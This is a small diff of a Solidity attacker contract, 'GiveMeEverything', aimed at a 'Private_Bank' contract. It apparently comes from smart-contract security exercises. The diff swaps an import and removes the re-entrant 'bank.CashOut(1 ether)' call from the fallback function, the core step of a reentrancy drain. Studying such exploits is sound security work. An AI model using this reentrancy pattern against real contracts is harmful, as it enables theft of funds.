@@ -1,6 +1,6 @@
 pragma solidity ^0.4.19;
 
-import "6.sol";
+import "4.sol";
 
 contract GiveMeEverything {
     Private_Bank public bank;
@@ -17,7 +17,7 @@ contract GiveMeEverything {
     }
     
     function() public payable {
-        bank.CashOut(1 ether);
+        
     }
     
 }
